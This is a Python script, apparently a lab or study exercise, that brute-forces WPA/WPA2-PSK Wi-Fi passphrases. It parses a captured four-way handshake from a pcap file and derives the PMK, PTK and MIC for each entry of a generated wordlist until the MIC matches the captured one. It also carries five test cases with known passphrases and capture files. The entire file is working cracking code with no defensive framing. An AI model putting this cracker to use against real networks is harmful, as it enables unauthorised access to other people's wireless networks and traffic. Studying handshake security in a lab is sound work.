from scapy.all import *
from scapy_eap import *
from pbkdf2 import PBKDF2
import hmac, hashlib
from hashlib import sha1, md5
import codecs
from itertools import product
from string import ascii_lowercase
import argparse

def strtoint(s ):
	return int (codecs.encode(s, 'hex'), 16)

def cs(a):
	return codecs.decode(a,'hex')

def encode(a):
	return codecs.encode(a,'hex')

def bytetostr(s):
	return str(s, 'utf-8')

def hextostr(s):
	return bytes.fromhex(s).decode('utf-8')

def PRF512(key, A, B):
    R = b''
    for i in range(4):
    	tmp = A + chr(0x00).encode() + B + chr(i).encode()
    	hmacsha1 = hmac.new(key, tmp, hashlib.sha1)
    	R = R + hmacsha1.digest()    	
    return R[:64]

def read_pcap(file):
	#load pcap file
	packets = rdpcap(file)
	# read the first packet to get SSID
	p = packets[0]
	SSID = p.getlayer(Dot11Elt).info
	# read 4 handshakes
	list_packets = []
	for p in packets:
		if p.haslayer(WPA_key):
			list_packets.append(p)
			# print(p.show2())	
	nonceA0 = list_packets[2].getlayer(WPA_key).nonce
	nonceS0 = list_packets[1].getlayer(WPA_key).nonce
	macStation = list_packets[1].getlayer(Dot11).addr1.replace(":","")
	macAP = list_packets[0].getlayer(Dot11).addr1.replace(":","")
	macAP = cs(macAP)
	macStation=cs(macStation)
	mic = list_packets[3].getlayer(WPA_key).wpa_key_mic
	mic = bytetostr(encode(mic))	
	frame = list_packets[3].getlayer(EAPOL)
	wpa = True
	if (frame.key_descriptor_Version == 2): wpa = False
	frame.wpa_key_mic = ''
	frame.key_ACK = 0
	frame = bytes(frame)
	# print(encode(frame))
	return SSID, macAP, macStation, nonceA0, nonceS0, frame, mic, wpa

###########################
def make_wordlist():
	wordlist = []
	keywords = [''.join(i) for i in product(ascii_lowercase, repeat = 4)]	
	for key in keywords:
		s = "aaaa" + key
		wordlist.append(s)
	return wordlist

def calculate_mic(kck, frame, wpa = True):
	hmacfunc = md5 if wpa else sha1
	mic = hmac.new(kck, frame, hmacfunc).hexdigest()
	return mic

def calculate_pmk(passphrase, SSID):
	f = PBKDF2 (passphrase, SSID, 4096)
	pmk = f.read (32)
	return pmk

def calculate_ptk(pmk, A, B):
	ptk = PRF512(pmk, A, B)
	return ptk

# test 1	
def test1():
	passphrase = b"radiustest"
	SSID = b"linksys54gh" 
	macAP = cs(b'000d3a2610fb')
	macStation =  cs(b'000c41d294fb')
	mic = 'd0ca4f2a783c4345b0c00a12ecc15f77'
	nonceA0 = cs(b'893ee551214557fff3c076ac977915a2060727038e9bea9b6619a5bab40f89c1')
	nonceS0 = cs(b'dabdc104d457411aee338c00fa8a1f32abfc6cfb794360adce3afb5d159a51f6')
	frame = cs(b'0103005ffe01090000000000000000001400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000')
	return passphrase, SSID, macAP, macStation, nonceA0, nonceS0, frame, mic

#test 2
def test2():
	passphrase = b"secretsecret"
	SSID = b"soho-psk" 
	macAP = cs(b'0020a64f31e4')
	macStation =  cs(b'000c41daf2e7')
	nonceA0 = cs(b'477ba8dc6d7e80d01a309d35891d868eb82bcc3b5d52b5a9a42c4cb7fd343a64')
	nonceS0 = cs(b'ed12afbda8c583050032e5b5295382d27956fd584a6343bafe49135f26952a0f')
	frame = cs(b'0103005ffe01090000000000000000000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f3a0f6914e28a2df103061a41ee838780000')
	pk = EAPOL(frame)
	mic = pk.wpa_key_mic
	mic = bytetostr(encode(mic))
	pk.key_ACK = 0
	pk.wpa_key_mic = ''		
	frame = bytes(pk)
	return passphrase, SSID, macAP, macStation, nonceA0, nonceS0, frame, mic

def test3():	
	file = 'wpa-Induction.pcap'
	SSID, macAP, macStation, nonceA0, nonceS0, frame, omic, wpa= read_pcap(file)
	passphrase = "Induction"
	return passphrase, SSID, macAP, macStation, nonceA0, nonceS0, frame, omic, wpa

def test4():	
	file = 'WPA2-PSK-Final.cap'
	SSID, macAP, macStation, nonceA0, nonceS0, frame, omic, wpa= read_pcap(file)
	passphrase = "Cisco123Cisco123"
	return passphrase, SSID, macAP, macStation, nonceA0, nonceS0, frame, omic, wpa

def test5():	
	file = 'capture_wpa.pcap'
	SSID, macAP, macStation, nonceA0, nonceS0, frame, omic, wpa= read_pcap(file)
	passphrase = "aaaababa"
	return passphrase, SSID, macAP, macStation, nonceA0, nonceS0, frame, omic, wpa

##################################

def main_program(mode):
	file = 'wpa-Induction.pcap'
	file = 'capture_wpa.pcap'
	wpa=True
	if (mode == 0):
		SSID, macAP, macStation, nonceA0, nonceS0, frame, omic, wpa= read_pcap(file)
		wordlist = make_wordlist()
	elif (mode == 1):
		passphrase, SSID, macAP, macStation, nonceA0, nonceS0, frame, omic= test1()
		wordlist = [passphrase]
	elif (mode ==2):	
		passphrase, SSID, macAP, macStation, nonceA0, nonceS0, frame, omic= test2()
		wordlist = [passphrase]
	elif (mode ==3):
		passphrase, SSID, macAP, macStation, nonceA0, nonceS0, frame, omic, wpa= test3()
		wordlist = [passphrase]
	elif (mode == 4):
		passphrase, SSID, macAP, macStation, nonceA0, nonceS0, frame, omic, wpa= test4()
		wordlist = [passphrase]
	elif (mode == 5):
		passphrase, SSID, macAP, macStation, nonceA0, nonceS0, frame, omic, wpa= test5()
		wordlist = [passphrase]
	else:
		print("Wrong mode!")
		return 
	
	flag = False
	for passphrase in wordlist:		
		print(passphrase)
		pmk = calculate_pmk(passphrase, SSID)
		print("pmk: ", encode(pmk))
		#calculate A, B
		A = b"Pairwise key expansion"
		B = min(macAP, macStation) + max(macAP, macStation) + min(nonceA0, nonceS0) + max(nonceA0, nonceS0)

		ptk = calculate_ptk(pmk, A, B)
		kck = ptk[:16]
		mic = calculate_mic(kck, frame, wpa)	
		print("omic: ", omic, " mic: ", mic)
		
		if (omic in mic):
			print("Now we see you: ", mic)
			flag = True
			break
	if (not flag):
		print("You loose!\n")


if __name__ == '__main__':
	parser = argparse.ArgumentParser()
	parser.add_argument('--mode', type=int, default=0, help='Section to run (0 - main program| 1 - 5 test case)')
	args = parser.parse_args()
	main_program(args.mode)